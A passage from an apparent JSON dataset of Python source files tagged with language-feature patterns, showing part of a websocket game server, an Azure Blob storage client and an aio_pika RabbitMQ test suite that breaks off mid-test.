                   if path == \"/viewer\":\n                        logger.info(\"Viewer connected\")\n                        self.viewers.add(websocket)\n                    game_info = self.game.info()\n                    await websocket.send(json.dumps(game_info))\n                if data[\"cmd\"] == \"key\" and self.current_player.ws == websocket:\n                    logger.debug((self.current_player.name, data))\n                    if len(data[\"key\"]) > 0:\n                        self.game.keypress(data[\"key\"][0])\n                    else:\n                        self.game.keypress(\"\")\n        except websockets.exceptions.ConnectionClosed as closed_reason:\n            logger.info(\"Client disconnected: %s\", closed_reason)\n            if websocket in self.viewers:\n                self.viewers.remove(websocket)\n    async def mainloop(self):\n        while True:\n            logger.info(\"Waiting for player\")\n            self.current_player = await self.players.get()\n            if self.current_player.ws.closed:\n                logger.error(\"<%s> disconnect while waiting\", self.current_player.name)\n                continue\n            try:\n                logger.info(\"Starting game for <%s>\", self.current_player.name)\n                if self.seed > 0:\n                    random.seed(self.seed)\n                self.game = Game()\n                game_info = await self.game.loop()\n                await self.send_info(game_info)\n                if self.grading:\n                    game_record = dict()\n                    game_record[\"player\"] = self.current_player.name\n                while self.game.running:\n                    state = await self.game.loop()\n                    state[\"player\"] = self.current_player.name\n                    state = json.dumps(state)\n                    await self.current_player.ws.send(state)\n                    if self.viewers:\n                        await asyncio.wait(\n                            [client.send(state) for client in self.viewers]\n                        )\n                self.save_highscores(self.game.score)\n                game_info = self.game.info()\n                game_info[\"player\"] = self.current_player.name\n                await self.send_info(game_info, highscores=True)\n                await self.current_player.ws.close()\n                self.current_player = None\n            except websockets.exceptions.ConnectionClosed:\n                self.current_player = None\n            finally:\n                try:\n                    if self.grading:\n                        game_record[\"score\"] = self.game.score\n                        requests.post(self.grading, json=game_record, timeout=2)\n                except RequestException as err:\n                    logger.error(err)\n                    logger.warning(\"Could not save score to server\")\n                if self.current_player:\n                    logger.info(\"Disconnecting <%s>\", self.current_player.name)\n                    await self.current_player.ws.close()\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--bind\", help=\"IP address to bind to\", default=\"\")\n    parser.add_argument(\"--port\", help=\"TCP port\", type=int, default=8000)\n    parser.add_argument(\"--seed\", help=\"Seed number\", type=int, default=0)\n    parser.add_argument(\n        \"--grading-server\",\n        help=\"url of grading server\",\n        default=\"http://atnog-tetriscores.av.it.pt/game\",\n    )\n    args = parser.parse_args()\n    g = GameServer(0, -1, args.seed, args.grading_server)\n    game_loop_task = asyncio.ensure_future(g.mainloop())\n    logger.info(\"Listenning @ %s:%s\", args.bind, args.port)\n    websocket_server = websockets.serve(g.incomming_handler, args.bind, args.port)\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(asyncio.gather(websocket_server, game_loop_task))\n    loop.close()",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        64,
                        82,
                        "async for",
                        "async for message in websocket:\n                data = json.loads(message)\n                if not \"cmd\" in data:\n                    continue\n                if data[\"cmd\"] == \"join\":\n                    if path == \"/player\":\n                        logger.info(\"<%s> has joined\", data[\"name\"])\n                        await self.players.put(Player(data[\"name\"], websocket))\n                    if path == \"/viewer\":\n                        logger.info(\"Viewer connected\")\n                        self.viewers.add(websocket)\n                    game_info = self.game.info()\n                    await websocket.send(json.dumps(game_info))\n                if data[\"cmd\"] == \"key\" and self.current_player.ws == websocket:\n                    logger.debug((self.current_player.name, data))\n                    if len(data[\"key\"]) > 0:\n                        self.game.keypress(data[\"key\"][0])\n                    else:\n                        self.game.keypress(\"\")"
                    ]
                ]
            }
        },
        "92": {
            "file": "from  inspect import iscoroutinefunction\nfrom asyncio import CancelledError\nimport datetime\nimport time\nimport hsds_logger as log\ntry:\n    from azure.storage.blob.aio import BlobServiceClient\n    from azure.core.exceptions import AzureError\nexcept ImportError:\n    log.warning(\"unable to import Azure blob packages\")\nfrom aiohttp.web_exceptions import HTTPNotFound, HTTPForbidden, HTTPInternalServerError\nimport config\nclass AzureBlobClient():\n    def __init__(self, app):\n        self._app = app\n        if \"azureBlobClient\" in app:\n            if \"token_expiration\" in app:\n                expiration = app[\"token_expiration\"]\n                now = datetime.datetime.now()\n                delta = expiration - now\n                if delta.total_seconds() > 10:\n                    self._client = app[\"azureBlobClient\"]\n                    return\n                log.info(\"Azure access token has expired - renewing\")\n            else:\n                self._client = app[\"azureBlobClient\"]\n                return\n        log.info(\"AzureBlobClient init\")\n        azure_connection_string = config.get('azure_connection_string')\n        if not azure_connection_string:\n            msg=\"No connection string specified\"\n            log.error(msg)\n            raise ValueError(msg)\n        log.info(f\"Using azure_connection_string: {azure_connection_string}\")\n        self._client = BlobServiceClient.from_connection_string(azure_connection_string)\n        app['azureBlobClient'] = self._client  \n    def _azure_stats_increment(self, counter, inc=1):\n        if \"azure_stats\" not in self._app:\n            azure_stats = {}\n            azure_stats[\"get_count\"] = 0\n            azure_stats[\"put_count\"] = 0\n            azure_stats[\"delete_count\"] = 0\n            azure_stats[\"list_count\"] = 0\n            azure_stats[\"error_count\"] = 0\n            azure_stats[\"bytes_in\"] = 0\n            azure_stats[\"bytes_out\"] = 0\n            self._app[\"azure_stats\"] = azure_stats\n        azure_stats = self._app['azure_stats']\n        if counter not in azure_stats:\n            log.error(f\"unexpected counter for azure_stats: {counter}\")\n            return\n        if inc < 1:\n            log.error(f\"unexpected inc for azure_stats: {inc}\")\n            return\n        azure_stats[counter] += inc\n    async def get_object(self, key, bucket=None, offset=0, length=None):\n        if not bucket:\n            log.error(\"get_object - bucket not set\")\n            raise HTTPInternalServerError()\n        if length:\n            log.info(f\"storage range request -- offset: {offset} length: {length}\")\n        else:\n            offset = None\n            length = None\n        start_time = time.time()\n        log.debug(f\"azureBlobClient.get_object({bucket}/{key} start: {start_time}\")\n        try:\n            async with self._client.get_blob_client(container=bucket, blob=key) as blob_client:\n                blob_rsp = await blob_client.download_blob(offset=offset, length=length)\n            data = await blob_rsp.content_as_bytes()\n            finish_time = time.time()\n            log.info(f\"azureBlobClient.get_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")\n        except CancelledError as cle:\n            self._azure_stats_increment(\"error_count\")\n            msg = f\"azureBlobClient.CancelledError getting get_object {key}: {cle}\"\n            log.error(msg)\n            raise HTTPInternalServerError()\n        except Exception as e:\n            if isinstance(e, AzureError):\n                if e.status_code == 404:\n                    msg = f\"storage key: {key} not found \"\n                    log.warn(msg)\n                    raise HTTPNotFound()\n                elif e.status_code in (401, 403):\n                    msg = f\"azureBlobClient.access denied for get key: {key}\"\n                    log.info(msg)\n                    raise HTTPForbidden()\n                else:\n                    self._azure_stats_increment(\"error_count\")\n                    log.error(f\"azureBlobClient.got unexpected AzureError for get_object {key}: {e.message}\")\n                    raise HTTPInternalServerError()\n            else:\n                log.error(f\"azureBlobClient.Unexpected exception for get_object {key}: {e}\")\n                raise HTTPInternalServerError()\n        return data\n    async def put_object(self, key, data, bucket=None):\n        if not bucket:\n            log.error(\"put_object - bucket not set\")\n            raise HTTPInternalServerError()\n        start_time = time.time()\n        log.debug(f\"azureBlobClient.put_object({bucket}/{key} start: {start_time}\")\n        try:\n            async with self._client.get_blob_client(container=bucket, blob=key) as blob_client:\n                blob_rsp = await blob_client.upload_blob(data, blob_type='BlockBlob', overwrite=True)\n            finish_time = time.time()\n            ETag = blob_rsp[\"etag\"]\n            lastModified = int(blob_rsp[\"last_modified\"].timestamp())\n            data_size = len(data)\n            rsp = {\"ETag\": ETag, \"size\": data_size, \"LastModified\": lastModified }\n            log.debug(f\"put_object {key} returning: {rsp}\")\n            log.info(f\"azureBlobClient.put_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")\n        except CancelledError as cle:\n            self._azure_stats_increment(\"error_count\")\n            msg = f\"azureBlobClient.CancelledError for put_object {key}: {cle}\"\n            log.error(msg)\n            raise HTTPInternalServerError()\n        except Exception as e:\n            if isinstance(e, AzureError):\n                if e.status_code == 404:\n                    msg = f\"azureBlobClient.key: {key} not found \"\n                    log.warn(msg)\n                    raise HTTPNotFound()\n                elif e.status_code in (401, 403):\n                    msg = f\"azureBlobClient.access denied for get key: {key}\"\n                    log.info(msg)\n                    raise HTTPForbidden()\n                else:\n                    self._azure_stats_increment(\"error_count\")\n                    log.error(f\"azureBlobClient.got unexpected AzureError for get_object {key}: {e.message}\")\n                    raise HTTPInternalServerError()\n            else:\n                log.error(f\"azureBlobClient.Unexpected exception for put_object {key}: {e}\")\n                raise HTTPInternalServerError()\n        if data and len(data) > 0:\n            self._azure_stats_increment(\"bytes_out\", inc=len(data))\n        log.debug(f\"azureBlobClient.put_object {key} complete, rsp: {rsp}\")\n        return rsp\n    async def delete_object(self, key, bucket=None):\n        if not bucket:\n            log.error(\"delete_object - bucket not set\")\n            raise HTTPInternalServerError()\n        start_time = time.time()\n        log.debug(f\"azureBlobClient.delete_object({bucket}/{key} start: {start_time}\")\n        try:\n            async with self._client.get_container_client(container=bucket) as container_client:\n                await container_client.delete_blob(blob=key)\n            finish_time = time.time()\n            log.info(f\"azureBlobClient.delete_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f}\")\n        except CancelledError as cle:\n            self._azure_stats_increment(\"error_count\")\n            msg = f\"azureBlobClient.CancelledError for delete_object {key}: {cle}\"\n            log.error(msg)\n            raise HTTPInternalServerError()\n        except Exception as e:\n            if isinstance(e, AzureError):\n                if e.status_code == 404:\n                    msg = f\"azureBlobClient.key: {key} not found \"\n                    log.warn(msg)\n                    raise HTTPNotFound()\n                elif e.status_code in (401, 403):\n                    msg = f\"azureBlobClient.access denied for delete key: {key}\"\n                    log.info(msg)\n                    raise HTTPForbidden()\n                else:\n                    self._azure_stats_increment(\"error_count\")\n                    log.error(f\"azureBlobClient.got unexpected AzureError for delete_object {key}: {e.message}\")\n                    raise HTTPInternalServerError()\n            else:\n                log.error(f\"azureBlobClient.Unexpected exception for put_object {key}: {e}\")\n                raise HTTPInternalServerError()\n    async def list_keys(self, prefix='', deliminator='', suffix='', include_stats=False, callback=None, bucket=None, limit=None):\n        if not bucket:\n            log.error(\"list_keys - bucket not set\")\n            raise HTTPInternalServerError()\n        log.info(f\"list_keys('{prefix}','{deliminator}','{suffix}', include_stats={include_stats}\")\n        if include_stats:\n            key_names = {}\n        else:\n            key_names = []\n        continuation_token = None\n        page_result_count = 1000  \n        if prefix == '':\n            prefix = None  \n        try:\n            async with self._client.get_container_client(container=bucket) as container_client:\n                while True:\n                    log.info(f\"list_blobs: {prefix} continuation_token: {continuation_token}\")\n                    keyList = container_client.walk_blobs(name_starts_with=prefix, delimiter=deliminator, results_per_page=page_result_count).by_page(continuation_token)\n                    async for key in await keyList.__anext__():\n                        key_name = key[\"name\"]\n                        if include_stats:\n                            ETag = key[\"etag\"]\n                            lastModified = int(key[\"last_modified\"].timestamp())\n                            data_size = key[\"size\"]\n                            key_names[key_name] = {\"ETag\": ETag, \"Size\": data_size, \"LastModified\": lastModified }\n                        else:\n                            key_names.append(key_name)\n                    if callback:\n                        if iscoroutinefunction(callback):\n                            await callback(self._app, key_names)\n                        else:\n                            callback(self._app, key_names)\n                    if not keyList.continuation_token or (limit and len(key_names) >= limit):\n                        break\n                    else:\n                        continuation_token = keyList.continuation_token\n        except CancelledError as cle:\n            self._azure_stats_increment(\"error_count\")\n            msg = f\"azureBlobClient.CancelledError for list_keys: {cle}\"\n            log.error(msg)\n            raise HTTPInternalServerError()\n        except Exception as e:\n            if isinstance(e, AzureError):\n                if e.status_code == 404:\n                    msg = f\"azureBlobClient not found error for list_keys\"\n                    log.warn(msg)\n                    raise HTTPNotFound()\n                elif e.status_code in (401, 403):\n                    msg = f\"azureBlobClient.access denied for list_keys\"\n                    log.info(msg)\n                    raise HTTPForbidden()\n                else:\n                    self._azure_stats_increment(\"error_count\")\n                    log.error(f\"azureBlobClient.got unexpected AzureError for list_keys: {e.message}\")\n                    raise HTTPInternalServerError()\n            else:\n                log.error(f\"azureBlobClient.Unexpected exception for list_keys: {e}\")\n                raise HTTPInternalServerError()\n        log.info(f\"list_keys done, got {len(key_names)} keys\")\n        if limit and len(key_names) > limit:\n            if include_stats:\n                keys = list(key_names.keys())\n                keys.sort()\n                for k in keys[limit:]:\n                    del key_names[k]\n            else:\n                key_names = key_names[:limit]\n        return key_names\n    async def releaseClient(self):\n        log.info(\"release AzureBlobClient\")\n        if 'azureBlobClient' in self._app:\n            client = self._app['azureBlobClient']\n            await client.close()\n            del self._app['azureBlobClient']",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "from asyncio import CancelledError"
                    ]
                ],
                "pep_525": [
                    [
                        189,
                        197,
                        "async for",
                        "async for key in await keyList.__anext__():\n                        key_name = key[\"name\"]\n                        if include_stats:\n                            ETag = key[\"etag\"]\n                            lastModified = int(key[\"last_modified\"].timestamp())\n                            data_size = key[\"size\"]\n                            key_names[key_name] = {\"ETag\": ETag, \"Size\": data_size, \"LastModified\": lastModified }\n                        else:\n                            key_names.append(key_name)"
                    ]
                ],
                "pep_498": [
                    [
                        34,
                        "        log.info(f\"Using azure_connection_string: {azure_connection_string}\")"
                    ],
                    [
                        66,
                        "        log.debug(f\"azureBlobClient.get_object({bucket}/{key} start: {start_time}\")"
                    ],
                    [
                        101,
                        "        log.debug(f\"azureBlobClient.put_object({bucket}/{key} start: {start_time}\")"
                    ],
                    [
                        136,
                        "        log.debug(f\"azureBlobClient.put_object {key} complete, rsp: {rsp}\")"
                    ],
                    [
                        143,
                        "        log.debug(f\"azureBlobClient.delete_object({bucket}/{key} start: {start_time}\")"
                    ],
                    [
                        175,
                        "        log.info(f\"list_keys('{prefix}','{deliminator}','{suffix}', include_stats={include_stats}\")"
                    ],
                    [
                        229,
                        "        log.info(f\"list_keys done, got {len(key_names)} keys\")"
                    ],
                    [
                        50,
                        "            log.error(f\"unexpected counter for azure_stats: {counter}\")"
                    ],
                    [
                        53,
                        "            log.error(f\"unexpected inc for azure_stats: {inc}\")"
                    ],
                    [
                        61,
                        "            log.info(f\"storage range request -- offset: {offset} length: {length}\")"
                    ],
                    [
                        72,
                        "            log.info(f\"azureBlobClient.get_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")"
                    ],
                    [
                        75,
                        "            msg = f\"azureBlobClient.CancelledError getting get_object {key}: {cle}\""
                    ],
                    [
                        110,
                        "            log.debug(f\"put_object {key} returning: {rsp}\")"
                    ],
                    [
                        111,
                        "            log.info(f\"azureBlobClient.put_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")"
                    ],
                    [
                        114,
                        "            msg = f\"azureBlobClient.CancelledError for put_object {key}: {cle}\""
                    ],
                    [
                        148,
                        "            log.info(f\"azureBlobClient.delete_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f}\")"
                    ],
                    [
                        151,
                        "            msg = f\"azureBlobClient.CancelledError for delete_object {key}: {cle}\""
                    ],
                    [
                        209,
                        "            msg = f\"azureBlobClient.CancelledError for list_keys: {cle}\""
                    ],
                    [
                        72,
                        "            log.info(f\"azureBlobClient.get_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")"
                    ],
                    [
                        72,
                        "            log.info(f\"azureBlobClient.get_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")"
                    ],
                    [
                        72,
                        "            log.info(f\"azureBlobClient.get_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")"
                    ],
                    [
                        81,
                        "                    msg = f\"storage key: {key} not found \""
                    ],
                    [
                        93,
                        "                log.error(f\"azureBlobClient.Unexpected exception for get_object {key}: {e}\")"
                    ],
                    [
                        111,
                        "            log.info(f\"azureBlobClient.put_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")"
                    ],
                    [
                        111,
                        "            log.info(f\"azureBlobClient.put_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")"
                    ],
                    [
                        111,
                        "            log.info(f\"azureBlobClient.put_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f} bytes={len(data)}\")"
                    ],
                    [
                        120,
                        "                    msg = f\"azureBlobClient.key: {key} not found \""
                    ],
                    [
                        132,
                        "                log.error(f\"azureBlobClient.Unexpected exception for put_object {key}: {e}\")"
                    ],
                    [
                        148,
                        "            log.info(f\"azureBlobClient.delete_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f}\")"
                    ],
                    [
                        148,
                        "            log.info(f\"azureBlobClient.delete_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f}\")"
                    ],
                    [
                        148,
                        "            log.info(f\"azureBlobClient.delete_object({key} bucket={bucket}) start={start_time:.4f} finish={finish_time:.4f} elapsed={finish_time-start_time:.4f}\")"
                    ],
                    [
                        157,
                        "                    msg = f\"azureBlobClient.key: {key} not found \""
                    ],
                    [
                        169,
                        "                log.error(f\"azureBlobClient.Unexpected exception for put_object {key}: {e}\")"
                    ],
                    [
                        187,
                        "                    log.info(f\"list_blobs: {prefix} continuation_token: {continuation_token}\")"
                    ],
                    [
                        215,
                        "                    msg = f\"azureBlobClient not found error for list_keys\""
                    ],
                    [
                        227,
                        "                log.error(f\"azureBlobClient.Unexpected exception for list_keys: {e}\")"
                    ],
                    [
                        85,
                        "                    msg = f\"azureBlobClient.access denied for get key: {key}\""
                    ],
                    [
                        124,
                        "                    msg = f\"azureBlobClient.access denied for get key: {key}\""
                    ],
                    [
                        161,
                        "                    msg = f\"azureBlobClient.access denied for delete key: {key}\""
                    ],
                    [
                        219,
                        "                    msg = f\"azureBlobClient.access denied for list_keys\""
                    ],
                    [
                        90,
                        "                    log.error(f\"azureBlobClient.got unexpected AzureError for get_object {key}: {e.message}\")"
                    ],
                    [
                        129,
                        "                    log.error(f\"azureBlobClient.got unexpected AzureError for get_object {key}: {e.message}\")"
                    ],
                    [
                        166,
                        "                    log.error(f\"azureBlobClient.got unexpected AzureError for delete_object {key}: {e.message}\")"
                    ],
                    [
                        224,
                        "                    log.error(f\"azureBlobClient.got unexpected AzureError for list_keys: {e.message}\")"
                    ]
                ]
            }
        },
        "93": {
            "file": "import asyncio\nimport logging\nimport os\nimport time\nimport unittest\nimport uuid\nfrom copy import copy\nfrom datetime import datetime\nfrom unittest import mock\nimport pytest\nimport shortuuid\nfrom aiormq import ChannelLockedResource\nimport aio_pika\nimport aio_pika.exceptions\nfrom aio_pika import connect, Message, DeliveryMode, Channel\nfrom aio_pika.exceptions import (\n    MessageProcessError, ProbableAuthenticationError, DeliveryError\n)\nfrom aio_pika.exchange import ExchangeType\nfrom . import BaseTestCase, AMQP_URL\nlog = logging.getLogger(__name__)\nclass TestCase(BaseTestCase):\n    async def test_channel_close(self):\n        client = await self.create_connection()\n        self.get_random_name(\"test_connection\")\n        self.get_random_name()\n        self.__closed = False\n        def on_close(ch):\n            log.info(\"Close called\")\n            self.__closed = True\n        channel = await client.channel()\n        channel.add_close_callback(on_close)\n        await channel.close()\n        await asyncio.sleep(0.5, loop=self.loop)\n        self.assertTrue(self.__closed)\n        with pytest.raises(RuntimeError):\n            await channel.initialize()\n        await self.create_channel(connection=client)\n    async def test_delete_queue_and_exchange(self):\n        queue_name = self.get_random_name(\"test_connection\")\n        exchange = self.get_random_name()\n        channel = await self.create_channel()\n        await channel.declare_exchange(exchange, auto_delete=True)\n        await channel.declare_queue(queue_name, auto_delete=True)\n        await channel.queue_delete(queue_name)\n        await channel.exchange_delete(exchange)\n    async def test_temporary_queue(self):\n        channel = await self.create_channel()\n        queue = await channel.declare_queue(auto_delete=True)\n        self.assertNotEqual(queue.name, '')\n        body = os.urandom(32)\n        await channel.default_exchange.publish(\n            Message(body=body),\n            routing_key=queue.name\n        )\n        message = await queue.get()\n        self.assertEqual(message.body, body)\n        await channel.queue_delete(queue.name)\n    async def test_internal_exchange(self):\n        client = await self.create_connection()\n        routing_key = self.get_random_name()\n        exchange_name = self.get_random_name(\"internal\", \"exchange\")\n        channel = await client.channel()\n        exchange = await self.declare_exchange(\n            exchange_name,\n            auto_delete=True,\n            internal=True,\n            channel=channel\n        )\n        queue = await self.declare_queue(auto_delete=True, channel=channel)\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        with pytest.raises(ValueError):\n            f = exchange.publish(\n                Message(\n                    body, content_type='text/plain',\n                    headers={'foo': 'bar'}\n                ),\n                routing_key\n            )\n            await f\n        await queue.unbind(exchange, routing_key)\n    async def test_declare_exchange_with_passive_flag(self):\n        client = await self.create_connection()\n        exchange_name = self.get_random_name()\n        channel = await client.channel()\n        with pytest.raises(aio_pika.exceptions.ChannelNotFoundEntity):\n            await self.declare_exchange(\n                exchange_name,\n                auto_delete=True,\n                passive=True,\n                channel=channel\n            )\n        channel1 = await client.channel()\n        channel2 = await client.channel()\n        await self.declare_exchange(\n            exchange_name,\n            auto_delete=True,\n            passive=False,\n            channel=channel1\n        )\n        await self.declare_exchange(\n            exchange_name,\n            auto_delete=False,\n            passive=True,\n            channel=channel2\n        )\n    async def test_declare_queue_with_passive_flag(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name()\n        channel = await client.channel()\n        with pytest.raises(aio_pika.exceptions.ChannelNotFoundEntity):\n            await self.declare_queue(\n                queue_name,\n                auto_delete=True,\n                passive=True,\n                channel=channel\n            )\n        channel1 = await client.channel()\n        channel2 = await client.channel()\n        await self.declare_queue(\n            queue_name,\n            auto_delete=True,\n            passive=False,\n            channel=channel1\n        )\n        await self.declare_queue(\n            queue_name,\n            auto_delete=False,\n            passive=True,\n            channel=channel2\n        )\n    async def test_simple_publish_and_receive(self):\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await self.create_channel()\n        exchange = await self.declare_exchange(\n            'direct', auto_delete=True, channel=channel\n        )\n        queue = await self.declare_queue(\n            queue_name, auto_delete=True, channel=channel\n        )\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        result = await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        self.assertTrue(result)\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.ack()\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(exchange, routing_key)\n    async def test_simple_publish_without_confirm(self):\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await self.create_channel(publisher_confirms=False)\n        exchange = await self.declare_exchange(\n            'direct', auto_delete=True, channel=channel\n        )\n        queue = await self.declare_queue(\n            queue_name, auto_delete=True, channel=channel\n        )\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        result = await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        self.assertIsNone(result)\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.ack()\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(exchange, routing_key)\n    async def test_simple_publish_and_receive_delivery_mode_explicitly(self):\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await self.create_channel()\n        exchange = await self.declare_exchange(\n            'direct', auto_delete=True, channel=channel\n        )\n        queue = await self.declare_queue(\n            queue_name, auto_delete=True, channel=channel\n        )\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'},\n                delivery_mode=None\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.ack()\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(exchange, routing_key)\n    async def test_simple_publish_and_receive_to_bound_exchange(self):\n        routing_key = self.get_random_name()\n        src_name = self.get_random_name(\"source\", \"exchange\")\n        dest_name = self.get_random_name(\"destination\", \"exchange\")\n        channel = await self.create_channel()\n        src_exchange = await self.declare_exchange(\n            src_name, auto_delete=True, channel=channel\n        )\n        dest_exchange = await self.declare_exchange(\n            dest_name, auto_delete=True, channel=channel\n        )\n        queue = await self.declare_queue(auto_delete=True, channel=channel)\n        await queue.bind(dest_exchange, routing_key)\n        await dest_exchange.bind(src_exchange, routing_key)\n        self.addCleanup(dest_exchange.unbind, src_exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await src_exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.ack()\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(dest_exchange, routing_key)\n    async def test_incoming_message_info(self):\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await self.create_channel()\n        exchange = await self.declare_exchange(\n            'direct', auto_delete=True, channel=channel\n        )\n        queue = await self.declare_queue(\n            queue_name, auto_delete=True, channel=channel\n        )\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        self.maxDiff = None\n        info = {\n            'headers': {\"foo\": b\"bar\"},\n            'content_type': \"application/json\",\n            'content_encoding': \"text\",\n            'delivery_mode': DeliveryMode.PERSISTENT.value,\n            'priority': 0,\n            'correlation_id': '1',\n            'reply_to': 'test',\n            'expiration': 1.5,\n            'message_id': shortuuid.uuid(),\n            'timestamp': datetime.utcfromtimestamp(int(time.time())),\n            'type': '0',\n            'user_id': 'guest',\n            'app_id': 'test',\n            'body_size': len(body)\n        }\n        msg = Message(\n            body=body,\n            headers={'foo': b'bar'},\n            content_type='application/json',\n            content_encoding='text',\n            delivery_mode=DeliveryMode.PERSISTENT,\n            priority=0,\n            correlation_id=1,\n            reply_to='test',\n            expiration=1.5,\n            message_id=info['message_id'],\n            timestamp=info['timestamp'],\n            type='0',\n            user_id='guest',\n            app_id='test'\n        )\n        await exchange.publish(msg, routing_key)\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.ack()\n        info['routing_key'] = incoming_message.routing_key\n        info['redelivered'] = incoming_message.redelivered\n        info['exchange'] = incoming_message.exchange\n        info['delivery_tag'] = incoming_message.delivery_tag\n        info['consumer_tag'] = incoming_message.consumer_tag\n        info['cluster_id'] = incoming_message.cluster_id\n        self.assertEqual(incoming_message.body, body)\n        self.assertDictEqual(incoming_message.info(), info)\n        await queue.unbind(exchange, routing_key)\n    async def test_context_process(self):\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await self.create_channel()\n        exchange = await self.declare_exchange(\n            'direct', auto_delete=True, channel=channel\n        )\n        queue = await self.declare_queue(\n            queue_name, auto_delete=True, channel=channel\n        )\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        with pytest.raises(AssertionError):\n            async with incoming_message.process(requeue=True):\n                raise AssertionError\n        self.assertEqual(incoming_message.locked, True)\n        incoming_message = await queue.get(timeout=5)\n        async with incoming_message.process():\n            pass\n        self.assertEqual(incoming_message.body, body)\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        with pytest.raises(MessageProcessError):\n            async with incoming_message.process():\n                incoming_message.reject(requeue=True)\n        self.assertEqual(incoming_message.locked, True)\n        incoming_message = await queue.get(timeout=5)\n        async with incoming_message.process(ignore_processed=True):\n            incoming_message.reject(requeue=False)\n        self.assertEqual(incoming_message.body, body)\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        with pytest.raises(AssertionError):\n            async with incoming_message.process(\n                requeue=True, reject_on_redelivered=True\n            ):\n                raise AssertionError\n        incoming_message = await queue.get(timeout=5)\n        with pytest.raises(AssertionError):\n            async with incoming_message.process(\n                requeue=True, reject_on_redelivered=True\n            ):\n                raise AssertionError\n        self.assertEqual(incoming_message.locked, True)\n        await queue.unbind(exchange, routing_key)\n    async def test_context_process_redelivery(self):\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await self.create_channel()\n        exchange = await self.declare_exchange(\n            'direct', auto_delete=True, channel=channel\n        )\n        queue = await self.declare_queue(\n            queue_name, auto_delete=True, channel=channel\n        )\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        with pytest.raises(AssertionError):\n            async with incoming_message.process(\n                requeue=True, reject_on_redelivered=True\n            ):\n                raise AssertionError\n        incoming_message = await queue.get(timeout=5)\n        with mock.patch('aio_pika.message.log') as message_logger:\n            with pytest.raises(Exception):\n                async 